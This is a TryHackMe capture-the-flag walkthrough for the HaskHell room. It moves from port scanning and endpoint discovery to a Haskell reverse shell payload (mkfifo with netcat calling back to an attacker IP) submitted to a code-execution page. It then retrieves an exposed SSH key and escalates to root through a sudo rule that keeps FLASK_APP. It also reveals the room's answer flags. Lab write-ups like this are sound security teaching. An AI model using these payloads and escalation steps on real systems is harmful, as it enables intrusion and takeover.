# HaskHell — TryHackMe Walkthrough

> Teach your CS professor that his PhD isn't in security.

<p align="center">
<a href="https://tryhackme.com/room/haskhell"><img src="https://miro.medium.com/v2/resize:fit:600/format:webp/0*yksKYQD-0yWkQxw6.png" alt="HaskHell" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/haskhell">
    <img src="https://img.shields.io/badge/TryHackMe-HaskHell-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Haskell%20RCE%20%7C%20SSH%20Key%20%7C%20Flask%20PATH%20Abuse-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | Haskell Reverse Shell via Code Submission |
| 4 | SSH Private Key Retrieval |
| 5 | Misconfigured sudo — Flask PATH Variable Abuse |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify non-standard web services through port scanning
- Enumerate web application endpoints using dirsearch
- Craft a Haskell reverse shell payload and submit it to a code execution endpoint
- Retrieve an exposed SSH private key and use it for authenticated access
- Abuse a `sudo` entry for `flask run` by controlling the `FLASK_APP` environment variable to execute arbitrary Python as root

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, dirsearch, wget, and Netcat installed
- Familiarity with Python and basic Flask concepts is helpful but not required

---

## Task 1 — HaskHell

---

### Step 1 — Network Enumeration with Nmap

**Approach:** Run an aggressive Nmap scan with service and OS detection to identify all open ports and services on the target.

```
kali@kali:~/CTFs/tryhackme/HaskHell$ sudo nmap -A -sS -sC -sV -O Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 11:03 CEST
Nmap scan report for Machine_IP
Host is up (0.040s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   33.32 ms 10.8.0.1
2   33.48 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.84 seconds
```

> **Note:** Two ports are open — **SSH on 22** and a **Gunicorn web server on port 5001**. Gunicorn is a Python WSGI HTTP server commonly used to serve Flask and Django applications. The non-standard port 5001 is our primary target. The next step is to enumerate its endpoints.

---

### Step 2 — Web Enumeration with dirsearch

**Approach:** Brute-force the Gunicorn web application on port 5001 to discover available endpoints.

```
kali@kali:~/CTFs/tryhackme/HaskHell$ sudo /opt/dirsearch/dirsearch.py -u http://Machine_IP:5001 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4658

Error Log: /opt/dirsearch/logs/errors-20-10-15_11-07-39.log

Target: http://Machine_IP:5001

Output File: /opt/dirsearch/reports/Machine_IP/_20-10-15_11-07-39.txt

[11:07:39] Starting:
[11:07:56] 200 -  237B  - /submit

Task Completed
```

> **Note:** A single endpoint is found: `/submit`. This is a code submission page — likely designed for students to submit Haskell code that the server then executes. Any endpoint that compiles and runs user-supplied code is a direct path to Remote Code Execution if there is no sandboxing.

---

### Step 3 — Haskell Reverse Shell via /submit

**Approach:** Navigate to `http://Machine_IP:5001/submit`. The page accepts Haskell source code and executes it server-side. Submit a Haskell script that uses `System.Process` to call a standard mkfifo reverse shell back to your Netcat listener.

The Haskell reverse shell payload:

```hs
#!/usr/bin/env runhaskhell
module Main where
import System.Process
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9001 >/tmp/f"
```

Start a Netcat listener on port 9001 before submitting, then trigger execution by submitting the file.

> **Note:** The Haskell `System.Process` module provides `callCommand`, which passes a string directly to the system shell — equivalent to `system()` in C. The mkfifo payload creates a named pipe at `/tmp/f` to establish a bidirectional shell over Netcat. Once the server executes the submitted Haskell script, the reverse shell connects back. After catching the shell, check for any exposed files being served on other ports — the server may be hosting its own SSH private key.

---

### Step 4 — Retrieving the Exposed SSH Private Key

**Approach:** After the reverse shell connects, check whether the server is hosting files over HTTP on another port. Download the exposed SSH private key, set correct permissions, and use it to log in as `prof` via SSH for a stable session.

```
kali@kali:~/CTFs/tryhackme/HaskHell$ wget http://Machine_IP:8000/id_rsa
--2020-10-15 11:16:23--  http://Machine_IP:8000/id_rsa
Connecting to Machine_IP:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1679 (1.6K) [application/octet-stream]
Saving to: 'id_rsa'

id_rsa                  100%[==============================>]   1.64K  --.-KB/s    in 0s

2020-10-15 11:16:23 (5.03 MB/s) - 'id_rsa' saved [1679/1679]

kali@kali:~/CTFs/tryhackme/HaskHell$ chmod 600 id_rsa
kali@kali:~/CTFs/tryhackme/HaskHell$ ssh -i id_rsa prof@Machine_IP
The authenticity of host 'Machine_IP (Machine_IP)' can't be established.
ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'Machine_IP' (ECDSA) to the known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

Last login: Wed May 27 18:45:06 2020 from 192.168.126.128
$ id
uid=1002(prof) gid=1002(prof) groups=1002(prof)
$ ls
__pycache__  user.txt
$ cat user.txt
flag{academic_dishonesty}
```

> **Note:** The SSH private key `id_rsa` is served publicly over HTTP on port 8000 — a serious misconfiguration. SSH keys must never be exposed over an unprotected web server. The `chmod 600` step is required because SSH refuses to use a private key file that is world-readable. Once logged in as `prof`, the user flag is immediately accessible.

---

### Question 1 — Get the flag in the user.txt file

<details>
<summary>Reveal Answer</summary>

**`flag{academic_dishonesty}`**

</details>

---

### Step 5 — Privilege Escalation via sudo Flask and FLASK_APP

**Approach:** Check `sudo -l` for available permissions. The `prof` user can run `/usr/bin/flask run` as root without a password, and critically the `sudo` configuration preserves the `FLASK_APP` environment variable. Create a malicious Python script that spawns a root shell, set `FLASK_APP` to point to it, then run `sudo flask run`.

```
prof@haskhell:~$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
prof@haskhell:~$ ls -l /usr/bin/flask
-rwxr-xr-x 1 root root 375 Jan 15  2018 /usr/bin/flask
prof@haskhell:~$ file /usr/bin/flask
/usr/bin/flask: Python script, ASCII text executable
prof@haskhell:~$ cat /usr/bin/flask
#!/usr/bin/python3
# EASY-INSTALL-ENTRY-SCRIPT: 'Flask==0.12.2','console_scripts','flask'
__requires__ = 'Flask==0.12.2'
import re
import sys
from pkg_resources import load_entry_point

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(
        load_entry_point('Flask==0.12.2', 'console_scripts', 'flask')()
    )
prof@haskhell:~$ cat > shell.py << EOF
> #!/usr/bin/env python3
> import pty
> pty.spawn("/bin/bash")
> EOF
prof@haskhell:~$ export FLASK_APP=shell.py
prof@haskhell:~$ sudo /usr/bin/flask run
root@haskhell:~# cat /root/root.txt
flag{im_purely_functional}
```

> **Note:** The key misconfiguration here is `env_keep+=FLASK_APP` in the sudo Defaults. When `sudo` is configured to keep a specific environment variable, an attacker can set it to any value before running the permitted command. Flask imports and executes whatever Python file `FLASK_APP` points to — so setting it to a script containing `pty.spawn("/bin/bash")` causes Flask to run that code as root the moment `sudo flask run` is called. The fix is to remove `FLASK_APP` from `env_keep`, forcing sudo to strip user-controlled environment variables before elevating.

---

### Question 2 — Obtain the flag in root.txt

<details>
<summary>Reveal Answer</summary>

**`flag{im_purely_functional}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap aggressive scan | Found SSH (22) and Gunicorn web server (5001) |
| 2 | dirsearch against port 5001 | Discovered `/submit` code execution endpoint |
| 3 | Haskell reverse shell submitted to `/submit` | Gained initial shell via mkfifo Netcat payload |
| 4 | Retrieved `id_rsa` from exposed HTTP server on port 8000 | Logged in as `prof` via SSH; retrieved user flag |
| 5 | `sudo flask run` with controlled `FLASK_APP` variable | Spawned root shell via malicious Python script; retrieved root flag |
